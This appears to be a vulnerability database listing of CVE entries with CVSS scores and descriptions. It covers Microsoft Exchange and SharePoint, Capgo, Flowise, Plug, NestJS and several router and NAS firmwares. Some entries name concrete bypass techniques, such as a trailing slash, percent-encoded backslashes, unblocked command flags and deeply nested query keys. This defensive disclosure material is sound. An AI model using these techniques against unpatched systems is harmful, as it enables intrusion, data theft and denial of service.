| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-05-11T19:11:16.000Z |

Microsoft SharePoint Server Remote Code Execution Vulnerability

### CVE-2021-28482

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-04-13T19:33:47.000Z |

Microsoft Exchange Server Remote Code Execution Vulnerability

### CVE-2020-17143

| 項目 | 値 |
|------|-----|
| CVSS | `8.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H/E:P/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2020-12-09T23:36:55.000Z |

Microsoft Exchange Server Information Disclosure Vulnerability

### CVE-2026-56322

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200` |
| Published | 2026-06-23T13:16:45.903 |

Capgo before 12.128.2 contains an information disclosure vulnerability in the unauthenticated /updates endpoint that resolves the defaultChannel parameter before enforcing privacy restrictions, allowing attackers to enumerate private channels and leak version/config state. Unauthenticated attackers can probe private channel names and distinguish valid channels from nonexistent ones based on response differences, revealing assigned bundle versions and platform-specific configuration details.

### CVE-2026-56274

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-06-23T13:16:45.083 |

Flowise before 3.1.2 contains multiple OS command injection vulnerabilities in the Custom MCP Server feature due to incomplete command-flag validation and a regex bypass in local file access restrictions. An attacker with a Flowise account of any role, or API access with view/update permissions for chatflows, can configure a malicious MCP server to bypass the validateCommandFlags blocklist (for example, 'docker build' is not blocked, and 'npx --yes' is not blocked while only '-y' is) and the validateArgsForLocalFileAccess checks, resulting in execution of arbitrary commands on the Flowise host.

### CVE-2026-56248

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-400` |
| Published | 2026-06-23T13:16:44.687 |

Cap-go capgo (capgo-backend) before 12.128.12 contains an unauthenticated denial-of-service vulnerability arising from the audit_logs table's Row-Level Security (RLS) policy when accessed via the Supabase PostgREST API. Because the PostgreSQL query planner executes costly logic before RLS rejection, unfiltered queries to the public.audit_logs endpoint using the public anon key consistently trigger statement timeouts (PostgREST error 57014). Under concurrency, this exhausts database resources and causes cascading HTTP 500 failures on unrelated endpoints (e.g. /orgs), resulting in an application-layer denial of service.

### CVE-2026-56225

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-269` |
| Published | 2026-06-23T13:16:44.250 |

Capgo before 12.128.2 contains an authorization bypass vulnerability in its public API key management handlers (get/put/delete/post). API keys created with mode=all but restricted to a single app via limited_to_apps are only checked for limited_to_orgs and not for limited_to_apps, so an app-scoped key can enumerate, update, and delete sibling API keys belonging to the same account that are outside its declared app scope, enabling tampering with account-level credentials.

### CVE-2026-54892

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-407` |
| Published | 2026-06-23T13:16:43.167 |

Inefficient algorithmic complexity in Plug's nested-parameter decoder allows an unauthenticated remote attacker to cause denial of service. Plug.Conn.Query.decode/4 (and Plug.Conn.Query.decode_each/2) parse query strings and application/x-www-form-urlencoded request bodies. When a key contains many bracketed segments such as a[a][a][a]=1, the decoder walks the brackets and, for each of the N levels, performs a map operation keyed on an ever-growing binary prefix of the key, hashing the full byte range at each step. The total decode cost is therefore quadratic in the number of nesting levels.

With the default Plug.Parsers.URLENCODED body limit of 1,000,000 bytes, a single request can carry roughly 333,000 nesting levels and saturate a BEAM scheduler for minutes. A small number of concurrent requests can saturate all schedulers and render a Plug-based server unresponsive. No authentication or knowledge of application routes is required.

This vulnerability is associated with program files lib/plug/conn/query.ex and program routines Plug.Conn.Query.decode/4, Plug.Conn.Query.decode_each/2, Plug.Conn.Query.split_keys/6, Plug.Conn.Query.insert_keys/3, and Plug.Conn.Query.finalize_pointer/2.

This issue affects plug from 1.15.0 before 1.15.5, 1.16.4, 1.17.2, 1.18.3, and 1.19.3.

### CVE-2025-71337

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-620` |
| Published | 2026-06-23T13:16:38.233 |

Flowise before 3.0.10 (affected versions 3.0.7 and earlier) contains an unverified email change vulnerability. An authenticated user can change the account email address, used as a login identifier and password-recovery channel, via the account profile endpoint without confirming the change to the original email address or re-entering the current password. By changing the recovery email, an attacker can take over the account and abuse password reset mechanisms.

### CVE-2023-54365

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-400` |
| Published | 2026-06-23T13:16:30.420 |

Traefik before 2.10.5 and 3.0.0-beta4 is affected by a denial-of-service vulnerability in HTTP/2 request handling inherited from the Go standard library's HTTP/2 implementation (CVE-2023-44487 / CVE-2023-39325, the 'Rapid Reset' technique). A remote attacker can rapidly create and cancel HTTP/2 streams to exhaust server resources and cause service unavailability.

### CVE-2026-56323

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-200` |
| Published | 2026-06-22T22:16:51.887 |

Capgo before 12.128.2 contains an information disclosure vulnerability in the /functions/v1/channel_self endpoint that allows unauthenticated attackers to enumerate non-public channel names and determine app existence and subscription status. Remote attackers can send GET requests with arbitrary app_id parameters to disclose internal rollout channels, enumerate valid applications across tenants, and leak billing status without authentication or device binding.

### CVE-2026-54281

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-863` |
| Published | 2026-06-22T22:16:49.433 |

Nest is a framework for building scalable Node.js server-side applications. Prior to 11.1.24, an authentication bypass vulnerability exists in @nestjs/platform-fastify. When middleware is registered through NestJS's MiddlewareConsumer.forRoutes() API on the Fastify adapter, an unauthenticated client can bypass the Nest middleware registered for that route by simply appending a trailing slash (/) to the request URL. This bypass works on the default Fastify adapter configuration. This vulnerability is fixed in 11.1.24.

### CVE-2026-53779

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-22` |
| Published | 2026-06-22T19:17:13.513 |

WebP Server Go through 0.14.4 contains a path traversal vulnerability on Windows that allows unauthenticated attackers to read files outside the configured IMG_PATH directory by sending requests with percent-encoded backslashes (%5C) that bypass the path.Clean() sanitization in handler/router.go. Attackers can exploit the discrepancy between Go's forward-slash-only path normalization and Windows file system APIs that treat backslashes and forward slashes as equivalent to access arbitrary files on the host filesystem accessible to the server process.

### CVE-2026-11834

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-78` |
| Published | 2026-06-22T19:16:38.963 |

A command
injection vulnerability has been identified in the DHCP option processing logic
in multiple TP-Link router models, due to insufficient validation of externally
supplied DHCP option data. An adjacent attacker may exploit this
vulnerability by supplying crafted DHCP responses, potentially resulting in unauthorized
command execution during device initialization or provisioning workflows. This
typically occurs when the device is in a factory-default or unconfigured state.





Successful
exploitation may allow an adjacent, unauthenticated attacker to execute
arbitrary commands with elevated privileges, potentially leading to full
compromise of the affected device and unauthorized administrative control.

### CVE-2026-50178

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79;CWE-94` |
| Published | 2026-06-22T16:16:37.797 |

The Angular Language Service VS Code Extension provides a rich editing experience for Angular templates. the client-side Angular Language Service VS Code extension configures the tooltip Markdown renderer with the isTrusted: true option (located in client/src/client.ts). This setting instructs VS Code to trust all rendered content it receives, which enables active elements such as command: URIs. However, the background Angular Language Server process fails to escape or sanitize brackets, raw links, and control characters from JSDoc strings before forwarding the hover Markdown content (located in server/src/handlers/hover.ts and server/src/text_render.ts). An attacker can leverage this behavior by crafting a project TypeScript or JavaScript file (or a third-party npm package dependency) containing a malicious JSDoc tooltip with an embedded active command link. When a developer hovers over the target symbol to render the tooltip and clicks the malicious link, the IDE executes the command sequence directly on the developer's host machine. Prior to 21.2.4,  This vulnerability is fixed in 21.2.4.

### CVE-2026-49241

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79;CWE-94;CWE-427;CWE-494` |
| Published | 2026-06-22T16:16:36.310 |

The Angular Language Service VS Code Extension provides a rich editing experience for Angular templates. Prior to 21.2.4, the client-side Angular Language Service VS Code extension reads the custom TypeScript SDK paths typescript.tsdk and js/ts.tsdk.path directly from workspace configurations (.vscode/settings.json) without verifying VS Code Workspace Trust state or asking for user consent (located in client/src/client.ts). The client-side extension then passes the parsed settings path as a command-line argument (--tsdk) to the background Node.js language server process. During server initialization, the background language server resolves and dynamically imports (via standard Node.js require()) the module library tsserverlibrary.js relative to the workspace-specified custom directory path. An attacker can exploit this behavior by committing a repository containing a local malicious tsserverlibrary.js script inside a custom folder, and a crafted .vscode/settings.json file pointing to that folder. When a developer opens the repository folder in VS Code, the extension automatically attempts to initialize and load the server, which dynamically resolves, loads, and executes the malicious script silently in the background. This vulnerability is fixed in 21.2.4.

### CVE-2017-20215

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2026-01-07T23:09:56.314Z |

FLIR Thermal Camera FC-S/PT firmware version 8.0.0.64 contains an authenticated OS command injection vulnerability that allows attackers to execute shell commands with root privileges. Authenticated attackers can inject arbitrary shell commands through unvalidated input parameters to gain complete control of the thermal camera system.

### CVE-2017-20212

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-22` |
| Published | 2026-01-07T23:09:54.925Z |

FLIR Thermal Camera F/FC/PT/D firmware version 8.0.0.64 contains an information disclosure vulnerability that allows unauthenticated attackers to read arbitrary files through unverified input parameters. Attackers can exploit the /var/www/data/controllers/api/xml.php readFile() function to access local system files without authentication.

### CVE-2025-15356

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-12-30T20:32:08.560Z |

A vulnerability has been found in Tenda AC20 up to 16.03.08.12. The impacted element is the function sscanf of the file /goform/PowerSaveSet. The manipulation of the argument powerSavingEn/time/powerSaveDelay/ledCloseType leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-15137

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-28T13:02:05.931Z |

A vulnerability was detected in TRENDnet TEW-800MB 1.0.1.0. Affected by this vulnerability is the function sub_F934  of the file NTPSyncWithHost.cgi. The manipulation results in command injection. The attack may be launched remotely. The exploit is now public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-15136

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-28T12:32:06.349Z |

A security vulnerability has been detected in TRENDnet TEW-800MB 1.0.1.0. Affected is the function do_setWizard_asp of the file /goform/wizardset of the component Management Interface. The manipulation of the argument WizardConfigured leads to command injection. The attack may be initiated remotely. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14847

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-130` |
| Published | 2025-12-19T11:00:22.465Z |

Mismatched length fields in Zlib compressed protocol headers may allow a read of uninitialized heap memory by an unauthenticated client. This issue affects all MongoDB Server v7.0 prior to 7.0.28 versions, MongoDB Server v8.0 versions prior to 8.0.17, MongoDB Server v8.2 versions prior to 8.2.3, MongoDB Server v6.0 versions prior to 6.0.27, MongoDB Server v5.0 versions prior to 5.0.32, MongoDB Server v4.4 versions prior to 4.4.30, MongoDB Server v4.2 versions greater than or equal to 4.2.0, MongoDB Server v4.0 versions greater than or equal to 4.0.0, and MongoDB Server v3.6 versions greater than or equal to 3.6.0.

### CVE-2025-14572

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-119` |
| Published | 2025-12-12T19:32:06.657Z |

A vulnerability was found in UTT 进取 512W up to 1.7.7-171114. This affects an unknown part of the file /goform/formWebAuthGlobalConfig. Performing manipulation of the argument hidcontact results in memory corruption. Remote exploitation of the attack is possible. The exploit has been made public and could be used. The vendor was contacted early about this disclosure but did not respond in any way.

### CVE-2025-14526

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-12-11T16:32:09.328Z |

A security flaw has been discovered in Tenda CH22 1.0.0.1. This affects the function frmL7ImForm of the file /goform/L7Im. Performing a manipulation of the argument page results in buffer overflow. Remote exploitation of the attack is possible. The exploit has been released to the public and may be used for attacks.

### CVE-2025-14108

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-05T22:02:05.032Z |

A weakness has been identified in ZSPACE Q2C NAS up to 1.1.0210050. Affected by this issue is the function zfilev2_api.OpenSafe of the file /v2/file/safe/open of the component HTTP POST Request Handler. This manipulation of the argument safe_dir causes command injection. It is possible to initiate the attack remotely. The exploit has been made available to the public and could be exploited. The vendor was contacted early about this disclosure and confirmed the existence of the vulnerability. A technical fix is planned to be released.

### CVE-2025-14107

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-05T21:32:08.655Z |

A security flaw has been discovered in ZSPACE Q2C NAS up to 1.1.0210050. Affected by this vulnerability is the function zfilev2_api.SafeStatus of the file /v2/file/safe/status of the component HTTP POST Request Handler. The manipulation of the argument safe_dir results in command injection. The attack may be performed from remote. The exploit has been released to the public and may be exploited. The vendor was contacted early about this disclosure and confirmed the existence of the vulnerability. A technical fix is planned to be released.

### CVE-2025-14106

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-77;CWE-74` |
| Published | 2025-12-05T21:32:06.411Z |

A vulnerability was identified in ZSPACE Q2C NAS up to 1.1.0210050. Affected is the function zfilev2_api.CloseSafe of the file /v2/file/safe/close of the component HTTP POST Request Handler. The manipulation of the argument safe_dir leads to command injection. The attack is possible to be carried out remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure and confirmed the existence of the vulnerability. A technical fix is planned to be released.

### CVE-2024-14007

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-306` |
| Published | 2025-11-24T20:31:02.227Z |

Shenzhen TVT Digital Technology Co., Ltd. NVMS-9000 firmware (used by many white-labeled DVR/NVR/IPC products) versions prior to 1.3.4 contain an authentication bypass in the NVMS-9000 control protocol. By sending a single crafted TCP payload to an exposed NVMS-9000 control port, an unauthenticated remote attacker can invoke privileged administrative query commands without valid credentials. Successful exploitation discloses sensitive information including administrator usernames and passwords in cleartext, network and service configuration, and other device details via commands such as queryBasicCfg, queryUserList, queryEmailCfg, queryPPPoECfg, and queryFTPCfg.

### CVE-2025-13288

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-11-17T15:32:07.862Z |

A security vulnerability has been detected in Tenda CH22 1.0.0.1. This impacts the function fromPptpUserSetting of the file /goform/PPTPUserSetting. The manipulation of the argument delno leads to buffer overflow. The attack is possible to be carried out remotely. The exploit has been disclosed publicly and may be used.

### CVE-2025-12622

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-11-03T07:32:13.624Z |

A vulnerability was determined in Tenda AC10 16.03.10.13. Affected by this vulnerability is the function formSysRunCmd of the file /goform/SysRunCmd. This manipulation of the argument getui causes buffer overflow. The attack may be initiated remotely. The exploit has been publicly disclosed and may be utilized.

### CVE-2025-12619

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-11-03T07:02:11.692Z |

A vulnerability was found in Tenda A15 15.13.07.13. Affected is the function fromSetWirelessRepeat of the file /goform/openNetworkGateway. The manipulation of the argument wpapsk_crypto2_4g results in buffer overflow. The attack can be launched remotely. The exploit has been made public and could be used.

### CVE-2025-12618

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-11-03T06:32:13.198Z |

A vulnerability has been found in Tenda AC8 16.03.34.06. This impacts an unknown function of the file /goform/DatabaseIniSet. The manipulation of the argument Time leads to buffer overflow. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-34311

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2025-10-28T14:43:31.324Z |

IPFire versions prior to 2.29 (Core Update 198) contain a command injection vulnerability that allows an authenticated attacker to execute arbitrary commands as the user 'nobody' via multiple parameters when creating a Proxy report. When a user creates a Proxy report the application issues an HTTP POST to /cgi-bin/logs.cgi/calamaris.dat and reads the values of DAY_BEGIN, MONTH_BEGIN, YEAR_BEGIN, DAY_END, MONTH_END, YEAR_END, NUM_DOMAINS, PERF_INTERVAL, NUM_CONTENT, HIST_LEVEL, NUM_HOSTS, NUM_URLS, and BYTE_UNIT, which are interpolated directly into the shell invocation of the mkreport helper. Because these parameters are never sanitized for improper characters or constructs, a crafted POST can inject shell metacharacters into one or more fields, causing arbitrary commands to run with the privileges of the 'nobody' user.

### CVE-2025-34312

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2025-10-28T14:37:47.417Z |

IPFire versions prior to 2.29 (Core Update 198) contain a command injection vulnerability that allows an authenticated attacker to execute arbitrary commands as the 'nobody' user via the BE_NAME parameter when installing a blacklist. When a blacklist is installed the application issues an HTTP POST to /cgi-bin/urlfilter.cgi and interpolates the value of BE_NAME directly into a shell invocation without appropriate sanitation. Crafted input can inject shell metacharacters, leading to arbitrary command execution in the context of the 'nobody' user.

### CVE-2025-12274

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T12:32:12.399Z |

A security vulnerability has been detected in Tenda CH22 1.0.0.1. Affected by this vulnerability is the function fromP2pListFilter of the file /goform/P2pListFilter. The manipulation of the argument page leads to buffer overflow. Remote exploitation of the attack is possible. The exploit has been disclosed publicly and may be used.

### CVE-2025-12273

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T12:32:08.278Z |

A weakness has been identified in Tenda CH22 1.0.0.1. Affected is the function fromwebExcptypemanFilter of the file /goform/webExcptypemanFilter. Executing a manipulation of the argument page can lead to buffer overflow. The attack may be launched remotely. The exploit has been made available to the public and could be used for attacks.

### CVE-2025-12272

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T12:02:14.528Z |

A security flaw has been discovered in Tenda CH22 1.0.0.1. This impacts the function fromAddressNat of the file /goform/addressNat. Performing a manipulation of the argument page results in buffer overflow. The attack may be initiated remotely. The exploit has been released to the public and may be used for attacks.

### CVE-2025-12271

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T12:02:10.792Z |

A vulnerability was identified in Tenda CH22 1.0.0.1. This affects the function fromRouteStatic of the file /goform/RouteStatic. Such manipulation of the argument page leads to buffer overflow. The attack can be launched remotely. The exploit is publicly available and might be used.

### CVE-2025-12265

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T11:02:07.933Z |

A weakness has been identified in Tenda CH22 1.0.0.1. Affected by this issue is the function fromVirtualSer of the file /goform/VirtualSer. This manipulation of the argument page causes buffer overflow. Remote exploitation of the attack is possible. The exploit has been made available to the public and could be used for attacks.

### CVE-2025-12234

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T06:22:21.764Z |

A vulnerability has been found in Tenda CH22 1.0.0.1. This affects the function fromSafeMacFilter of the file /goform/SafeMacFilter. The manipulation of the argument page leads to buffer overflow. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

### CVE-2025-12233

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T06:22:17.626Z |

A flaw has been found in Tenda CH22 1.0.0.1. Affected by this issue is the function fromSafeUrlFilter of the file /goform/SafeUrlFilter. Executing a manipulation of the argument page can lead to buffer overflow. The attack can be launched remotely. The exploit has been published and may be used.

### CVE-2025-12232

| 項目 | 値 |
|------|-----|
| CVSS | `8.7` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-120;CWE-119` |
| Published | 2025-10-27T06:22:13.528Z |

A vulnerability was detected in Tenda CH22 1.0.0.1. Affected by this vulnerability is the function fromSafeClientFilter of the file /goform/SafeClientFilter. Performing a manipulation of the argument page results in buffer overflow. The attack can be initiated remotely. The exploit is now public and may be used.

### CVE-2025-11549

| 項目 | 値 |
